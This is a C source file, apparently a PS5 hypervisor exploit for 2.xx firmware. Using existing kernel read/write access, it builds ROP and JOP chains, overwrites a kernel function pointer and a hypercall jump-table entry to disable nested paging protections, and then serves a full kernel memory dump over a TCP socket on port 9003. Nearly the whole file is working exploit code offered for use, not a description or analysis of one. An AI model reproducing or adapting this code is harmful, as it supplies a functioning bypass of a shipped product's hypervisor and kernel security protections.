#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#include <ps5/kernel.h>

#include "config.h"
#include "debug_log.h"
#include "kdlsym.h"
#include "krop.h"
#include "mirror.h"
#include "notify.h"
#include "paging.h"
#include "util.h"

struct kctx {
    uint64_t rbx;
    uint64_t rsp;
    uint64_t rbp;
    uint64_t r12;
    uint64_t r13;
    uint64_t r14;
    uint64_t r15;
    uint64_t ret;
};

int g_debug_sock = -1;

int sceKernelSleep(int secs);

void kernel_write8(uint64_t addr, uint64_t val)
{
    uint64_t val_to_write = val;
    kernel_copyin(&val_to_write, addr, sizeof(val_to_write));
}

void kernel_write4(uint64_t addr, uint32_t val)
{
    uint32_t val_to_write = val;
    kernel_copyin(&val_to_write, addr, sizeof(val_to_write));
}

uint64_t kernel_read8(uint64_t addr)
{
    uint64_t val;
    kernel_copyout(addr, &val, sizeof(val));
    return val;
}

uint32_t kernel_read4(uint64_t addr)
{
    uint32_t val;
    kernel_copyout(addr, &val, sizeof(val));
    return val;
}

void dump_kernel_to_client(int client)
{
    int write_ret;
    int num_text_pages;
    char data_buf[0x4000];
    void *tmp_kernel_window;

    num_text_pages = (int) ((KERNEL_ADDRESS_DATA_BASE - ktext(0)) / 0x1000);
    SOCK_LOG("[+] Dumping kernel to client (.text pages = 0x%x)\n", num_text_pages);

    sceKernelSleep(2);

    // Dump text pages
    for (int i = 0; i < num_text_pages; i++) {
        tmp_kernel_window = mirror_page_no_store(ktext(0 + (i * 0x1000)));

        write_ret = write(client, tmp_kernel_window, 0x1000);
        if (write_ret < 0) {
            SOCK_LOG("[+] Failed to write a kernel page, returning\n");
            return;
        }
    }

    // Dump data pages
    for (uint64_t i = 0; ; i += 0x4000) {
        kernel_copyout(KERNEL_ADDRESS_DATA_BASE + i, &data_buf, sizeof(data_buf));
        write_ret = write(client, &data_buf, sizeof(data_buf));
        if (write_ret < 0)
            break;
    }

    // SOCK_LOG("[+] dumping kernel to client\n");
    // sceKernelSleep(2);

    // for (uint64_t i = 0; ; i += 0x1000) {
    //     kernel_copyout(ktext(i), &debug_buf, sizeof(debug_buf));
    //     write_ret = write(client, &debug_buf, sizeof(debug_buf));
    //     if (write_ret < 0)
    //         break;
    // }

    close(client);
    SOCK_LOG("[+] Done\n");
}

int run_dump_server(int port)
{
    int s;
    int client;
    struct sockaddr_in sockaddr;

    s = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&sockaddr, sizeof(sockaddr));

    sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(s, (const struct sockaddr *) &sockaddr, sizeof(sockaddr)) < 0) {
        SOCK_LOG("[!] failed to bind server\n");
		return -1;
    }

	if (listen(s, 5) < 0) {
        SOCK_LOG("[!] failed to listen on server\n");
		return -1;
    }

    SOCK_LOG("[SRV] dump server is now running (port: %d)...\n", port);

    // Accept clients
	for (;;) {
        client = accept(s, 0, 0);
        SOCK_LOG("[SRV] accepted a client = %d\n", client);

        if (client > 0) {
            dump_kernel_to_client(client);
        }
    }

    return 0;
}

int main()
{
	int ret;
	int debug_sock = -1;
	struct sockaddr_in addr;
    uint32_t *mirror_hv_jmptable_ent;

	// Open a debug socket if enabled
	if (PC_DEBUG_ENABLED) {
		debug_sock = socket(AF_INET, SOCK_STREAM, 0);
		if (debug_sock < 0) {
			return 0xDEAD0001;
		}

		inet_pton(AF_INET, PC_DEBUG_IP, &addr.sin_addr);
		addr.sin_family = AF_INET;
		addr.sin_len    = sizeof(addr);
		addr.sin_port   = htons(PC_DEBUG_PORT);

		ret = connect(debug_sock, (const struct sockaddr *) &addr, sizeof(addr));
		if (ret < 0) {
			return 0xDEAD0002;
		}

		SOCK_LOG("[!] debug socket connected\n");
        g_debug_sock = debug_sock;
	}

    // Kernel ROP gadgets for 2.xx firmware
    uint64_t hv_rop_chain_2xx[] = {
        0x0,

        KROP_GADGET_200_POP_RAX,
        KROP_DATA_CAVE_200_SAVECTX + 0x28,
        KROP_GADGET_200_MOV_RAX_QWORD_PTR_RAX,
        KROP_GADGET_200_POP_RDX,
        0x8,
        KROP_GADGET_200_ADD_RAX_RDX,
        KROP_GADGET_200_MOV_RAX_QWORD_PTR_RAX,
        KROP_GADGET_200_POP_RDX,
        0x90,
        KROP_GADGET_200_ADD_RAX_RDX,
        KROP_GADGET_200_MOV_QWORD_PTR_RAX_0, 

        KROP_GADGET_200_POP_RDI,
        KROP_DATA_CAVE_200_SAVECTX + 0x38,
        KROP_GADGET_200_POP_RSI,
        KROP_GADGET_200_RETURN_ADDR,
        KROP_GADGET_200_MOV_QWORD_PTR_RDI_RSI,
        // KROP_GADGET_200_INFLOOP, // INFLOOP
        KROP_GADGET_200_POP_RDI,
        KROP_DATA_CAVE_200_SAVECTX,
        // KROP_GADGET_200_INFLOOP, // INFLOOP
        KROP_GADGET_200_LONGJMP,
        KROP_GADGET_200_INFLOOP, // INFLOOP
    };

    // Mirror map the hypervisor's jump table in kernel data
    mirror_hv_jmptable_ent = (uint32_t *) get_mirrored_addr(KROP_GADGET_200_HV_JMP_TABLE_HYPERCALL_ENT);

    // Create context
    struct kctx ropctx;

    ropctx.rbx = 0;
    ropctx.rsp = KROP_DATA_CAVE_200_ROP_CHAIN;
    ropctx.rbp = 0;
    ropctx.r12 = 0;
    ropctx.r13 = 0;
    ropctx.r14 = 0;
    ropctx.r15 = 0;
    ropctx.ret = KROP_GADGET_200_RET;


    SOCK_LOG("[+] Copying in ROP ctx and chain\n");
    kernel_copyin(&ropctx, KROP_DATA_CAVE_200_ROPCTX, sizeof(ropctx));
    kernel_copyin(&hv_rop_chain_2xx, KROP_DATA_CAVE_200_ROP_CHAIN, sizeof(hv_rop_chain_2xx));

    SOCK_LOG("[+] Writing RSI ptr\n");
    kernel_write8(KROP_DATA_CAVE_200_RSI_PTR, KROP_DATA_CAVE_200_SAVECTX);

    SOCK_LOG("[+] Reading original function ptr for jop gadget 2\n");
    uint64_t orig_fptr = kernel_read8(KROP_GADGET_200_FUNC_PTR);
    SOCK_LOG("  [+] 0x%lx\n", orig_fptr);

    SOCK_LOG("[+] Replacing function with longjmp (0x%lx)\n", KROP_GADGET_200_LONGJMP);
    kernel_write8(KROP_GADGET_200_FUNC_PTR, KROP_GADGET_200_LONGJMP);
    SOCK_LOG("  [+] 0x%lx\n", kernel_read8(KROP_GADGET_200_FUNC_PTR));


    SOCK_LOG("[+] Reading original hypercall jmp table offset\n");
    uint32_t orig_offset = *mirror_hv_jmptable_ent;
    SOCK_LOG("  [+] 0x%x\n", orig_offset)


    SOCK_LOG("[+] Replacing offset with JOP gadget 1 (0x%lx)\n", KROP_GADGET_200_JOP1_OFFSET_FROM_JMP_TABLE);
    *mirror_hv_jmptable_ent = KROP_GADGET_200_JOP1_OFFSET_FROM_JMP_TABLE;
    SOCK_LOG("  [+] 0x%x\n", kernel_read4(KROP_GADGET_200_HV_JMP_TABLE_HYPERCALL_ENT));


    // Run ROP chain to kickstart hijack vmmcall
    struct krop_manage *krop = create_krop_chain();

    // r9 = setjmp
    kernel_write8(KROP_GADGET_200_DATA_CAVE + 0x1048, KROP_GADGET_200_SETJMP);
    krop_push(krop, KROP_GADGET_200_POP_RDI);
    krop_push(krop, KROP_GADGET_200_DATA_CAVE + 0x1000);
    krop_push(krop, KROP_GADGET_200_POP_RAX);
    krop_push(krop, KROP_GADGET_200_RET);
    krop_push(krop, KROP_GADGET_200_MOV_R9_QWORD_PTR_RDI_48h);

    // rbx = ropctx
    krop_push(krop, KROP_GADGET_200_POP_RBX);                     
    krop_push(krop, KROP_DATA_CAVE_200_ROPCTX);

    // rsi = rsi ptr
    krop_push(krop, KROP_GADGET_200_POP_RSI);                     
    krop_push(krop, KROP_DATA_CAVE_200_RSI_PTR);

    // r12 = JOP 2 offset
    krop_push(krop, KROP_GADGET_200_POP_R12);
    krop_push(krop, KROP_GADGET_200_JOP2_OFFSET_FROM_JMP_TABLE);

    // hypercall
    krop_push(krop, KROP_GADGET_200_HYPERCALL_SET_CPUID_PS4);

    // return cleanly
    krop_push(krop, KROP_GADGET_200_POP_R12);
    krop_push(krop, ktext(0x470BD50));
    krop_push(krop, KROP_GADGET_200_RET);
    krop_push(krop, KROP_GADGET_200_RET);
    krop_push(krop, KROP_GADGET_200_RET);
    krop_push(krop, KROP_GADGET_200_RET);
    krop_push_exit(krop);
    //krop_push_infloop(krop);

    SOCK_LOG("[+] About to ROP (disable NPT/GMET in VMCB)...\n");
    sceKernelSleep(1);

    krop_run(krop);

    //SOCK_LOG("[+] Byepervisor :)\n");
    //SOCK_LOG("[+] Replacing function with original\n");
    kernel_write8(KROP_GADGET_200_FUNC_PTR, orig_fptr);

    //SOCK_LOG("[+] Replacing offset with original\n");
    *mirror_hv_jmptable_ent = orig_offset;

    pin_to_core(krop->core);
    SOCK_LOG("[+] Pinned to core: 0x%x\n", get_cpu_core());

    SOCK_LOG("[+] Hypervisor should be broken on core 0x%x (nested paging disabled)\n", get_cpu_core());

    // Lets mirror kernel .text base :)
    void *ktext_test = (uint32_t *) get_mirrored_addr(ktext(0x2A66C0));
    SOCK_LOG("[+] Mirrored kernel .text sys_getppid = %p (-> 0x%lx)\n", ktext_test, ktext(0x2A66C0));

    DumpHex(ktext_test, 0x400);

    // SOCK_LOG("[+] Disabling XOM on all kernel .text pages\n");

    // uint64_t kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
    // for (uint64_t kaddr = ktext(0); kaddr < KERNEL_ADDRESS_DATA_BASE; kaddr += 0x1000) {
    //     uint64_t kernel_pte_addr;
    //     uint64_t kernel_pte;

    //     kernel_pte_addr = find_pte(kernel_pmap, kaddr, &kernel_pte);
    //     if (kernel_pte_addr == 0xFFFFFFFFFFFFFFFFull) {
    //         kernel_pte_addr = find_pde(kernel_pmap, kaddr, &kernel_pte);
    //         if (kernel_pte_addr != 0xFFFFFFFFFFFFFFFFull) {
    //             CLEAR_PDE_BIT(kernel_pte, XOTEXT);
    //             kernel_copyin(&kernel_pte, kernel_pte_addr, sizeof(kernel_pte));
    //         }
    //         continue;
    //     }

    //     CLEAR_PDE_BIT(kernel_pte, XOTEXT);
    //     kernel_copyin(&kernel_pte, kernel_pte_addr, sizeof(kernel_pte));
    // }

    // // Give time for TLBs to be flushed and page table changes to be recognized
    // sceKernelSleep(10);

    // struct krop_manage *krop_flush_tlbs = create_krop_chain();
    // krop_push(krop_flush_tlbs, )

    run_dump_server(9003);

    reset_mirrors();
    return 0;
}
